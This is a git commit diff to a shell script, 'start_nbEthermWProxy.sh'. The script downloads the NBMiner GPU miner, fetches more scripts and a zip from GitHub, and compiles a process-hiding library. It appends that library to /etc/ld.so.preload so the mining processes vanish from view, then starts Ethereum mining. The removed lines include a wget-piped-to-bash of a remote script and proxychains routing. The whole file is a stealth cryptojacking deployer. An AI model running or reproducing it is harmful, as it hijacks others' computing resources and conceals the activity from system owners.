447ddd0739286e8fb8784bfdfc7695c05accaffb
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-04-07 12:09:55 +0200

    Update start_nbEthermWProxy.sh

--- start_nbEthermWProxy.sh
+++ start_nbEthermWProxy.sh
@@ -1,16 +1,13 @@
 #!/bin/sh
-wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
-sleep .1
 wget https://github.com/NebuTech/NBMiner/releases/download/v37.1/NBMiner_37.1_Linux.tgz
 tar -xvzf NBMiner_37.1_Linux.tgz
 cd NBMiner_Linux
-proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nbEthermineWithProxy.sh
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nbEthermineWithProxy.sh
 chmod +x nbEthermineWithProxy.sh
-proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
 unzip magicNb.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-proxychains curl ifconfig.me
 ./nbEthermineWithProxy.sh
